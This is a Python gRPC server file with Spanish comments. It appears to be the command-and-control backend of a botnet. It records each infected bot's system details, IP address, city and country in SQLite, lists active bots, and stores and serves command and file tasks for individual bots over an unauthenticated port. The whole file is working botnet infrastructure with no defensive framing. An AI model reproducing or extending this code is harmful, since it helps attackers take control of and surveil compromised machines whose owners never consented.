import os
import sqlite3
from concurrent import futures
import grpc
import botnet_pb2
import botnet_pb2_grpc
import uuid
import datetime

DB_PATH = os.path.join(os.path.dirname(__file__), "db", "botnet.db")


# -----------------------------
# Inicializar base de datos
# -----------------------------
def init_db():
    os.makedirs(os.path.dirname(DB_PATH), exist_ok=True)
    conn = sqlite3.connect(DB_PATH)
    cur = conn.cursor()

    # Tabla de bots
    cur.execute("""
        CREATE TABLE IF NOT EXISTS bots (
            bot_id TEXT PRIMARY KEY,
            status INTEGER,
            system TEXT,
            node TEXT,
            release TEXT,
            version TEXT,
            machine TEXT,
            processor TEXT,
            ip TEXT,
            city TEXT,
            country TEXT
        )
    """)

    # Tabla de tareas
    cur.execute("""
        CREATE TABLE IF NOT EXISTS tasks (
            task_id TEXT PRIMARY KEY,
            bot_id TEXT,
            type INTEGER,
            status INTEGER,
            date_start TEXT,
            date_finish TEXT,
            command TEXT,
            file TEXT,
            response TEXT
        )
    """)

    conn.commit()
    conn.close()


# -----------------------------
# Implementación del servicio
# -----------------------------
class BotnetServicer(botnet_pb2_grpc.BotnetServicer):

    # ----- Bots -----
    def SetConnection(self, request, context):
        """Registra/actualiza conexión de un bot"""
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("""
            INSERT INTO bots (bot_id, status, system, node, release, version, machine, processor, ip, city, country)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            ON CONFLICT(bot_id) DO UPDATE SET
                status=excluded.status,
                system=excluded.system,
                node=excluded.node,
                release=excluded.release,
                version=excluded.version,
                machine=excluded.machine,
                processor=excluded.processor,
                ip=excluded.ip,
                city=excluded.city,
                country=excluded.country
        """, (
            request.bot_id,
            request.status,
            request.system,
            request.node,
            request.release,
            request.version,
            request.machine,
            request.processor,
            request.geo.ip if request.geo else None,
            request.geo.city if request.geo else None,
            request.geo.country if request.geo else None
        ))
        conn.commit()
        conn.close()

        print(f"[INFO] Bot {request.bot_id} conectado/actualizado en la DB.")
        return botnet_pb2.Response(
            status=botnet_pb2.Status.OK,
            type=botnet_pb2.Type.CONNECTION
        )

    def GetBots(self, request, context):
        """Devuelve un stream con todos los bots"""
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT * FROM bots")
        for row in cur.fetchall():
            yield botnet_pb2.Bot(
                bot_id=row[0],
                status=row[1],
                system=row[2],
                node=row[3],
                release=row[4],
                version=row[5],
                machine=row[6],
                processor=row[7],
                geo=botnet_pb2.Geo(
                    bot_id=row[0],
                    ip=row[8] or "",
                    city=row[9] or "",
                    country=row[10] or ""
                )
            )
        conn.close()

    def GetActiveBots(self, request, context):
        """Devuelve solo los bots activos"""
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT * FROM bots WHERE status=?", (botnet_pb2.StatusBot.CONNECTED,))
        for row in cur.fetchall():
            yield botnet_pb2.Bot(
                bot_id=row[0],
                status=row[1],
                system=row[2],
                node=row[3],
                release=row[4],
                version=row[5],
                machine=row[6],
                processor=row[7]
            )
        conn.close()

    def GetBot(self, request, context):
        """Devuelve info de un bot específico"""
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT * FROM bots WHERE bot_id=?", (request.bot_id,))
        row = cur.fetchone()
        conn.close()
        if row:
            return botnet_pb2.Bot(
                bot_id=row[0],
                status=row[1],
                system=row[2],
                node=row[3],
                release=row[4],
                version=row[5],
                machine=row[6],
                processor=row[7]
            )
        context.set_code(grpc.StatusCode.NOT_FOUND)
        context.set_details("Bot no encontrado")
        return botnet_pb2.Bot()

    # ----- Tareas -----
    def AddTask(self, request_iterator, context):
        """Agrega tareas (cliente-streaming)"""
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        for task in request_iterator:
            cur.execute("""
                INSERT INTO tasks (task_id, bot_id, type, status, date_start, date_finish, command, file, response)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                task.task_id,
                task.bot_id,
                task.type,
                task.status,
                task.date_start,
                task.date_finish,
                task.command,
                task.file,
                task.response
            ))
            print(f"[TASK] Tarea {task.task_id} registrada para bot {task.bot_id}")
        conn.commit()
        conn.close()
        return botnet_pb2.Response(
            status=botnet_pb2.Status.OK,
            type=botnet_pb2.Type.CMD
        )

    def GetTasks(self, request, context):
        """Devuelve todas las tareas"""
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT * FROM tasks")
        for row in cur.fetchall():
            yield botnet_pb2.Task(
                task_id=row[0],
                bot_id=row[1],
                type=row[2],
                status=row[3],
                date_start=row[4],
                date_finish=row[5],
                command=row[6],
                file=row[7],
                response=row[8]
            )
        conn.close()

    def GetTasksBot(self, request, context):
        """Devuelve tareas de un bot específico"""
        conn = sqlite3.connect(DB_PATH)
        cur = conn.cursor()
        cur.execute("SELECT * FROM tasks WHERE bot_id=?", (request.bot_id,))
        for row in cur.fetchall():
            yield botnet_pb2.Task(
                task_id=row[0],
                bot_id=row[1],
                type=row[2],
                status=row[3],
                date_start=row[4],
                date_finish=row[5],
                command=row[6],
                file=row[7],
                response=row[8]
            )
        conn.close()

    # Los demás métodos (GetFile, SendFile, etc.) se pueden implementar después


# -----------------------------
# Servidor gRPC
# -----------------------------
def serve():
    init_db()
    server = grpc.server(futures.ThreadPoolExecutor(max_workers=10))
    botnet_pb2_grpc.add_BotnetServicer_to_server(BotnetServicer(), server)
    server.add_insecure_port("[::]:50051")
    print("Servidor gRPC escuchando en puerto 50051...")
    server.start()
    server.wait_for_termination()


if __name__ == "__main__":
    serve()